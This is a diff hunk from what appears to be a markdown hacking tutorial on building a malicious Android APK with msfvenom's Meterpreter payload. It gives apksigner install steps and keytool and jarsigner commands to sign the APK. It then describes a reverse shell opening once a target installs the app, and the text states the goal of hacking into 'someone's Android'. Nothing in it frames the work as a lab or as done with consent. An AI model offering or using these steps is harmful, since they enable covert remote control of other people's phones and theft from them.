@@ -32,12 +32,13 @@ With a public IP, the command might look like this: msfvenom -p android/meterpre
 3. Sometimes the APK might not install and ask for a signing. This is an added security check by Android, so we need to sign our malicious.apk file as well.
    Usually, it's available with Android Studio in Windows.
    In Linux, you can install apksigner. It comes with the Android SDK. If you don’t have it, install zipalign and apksigner using: sudo apt install apksigner zipalign -y 
+   The command to sign the apk is:
    keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore malicious.apk my-key-alias
 
-4. Once the target installs and opens the APK, you should see a Meterpreter session open in Metasploit:
+5. Once the target installs and opens the APK, you should see a Meterpreter session open in Metasploit:
    meterpreter >
-   Now, your reverse shell is good to go, and you can try commands to hack into someone's android.
+   Now, your reverse shell is good to go, and you can try commands to hack into someone's Android.
 
   
 
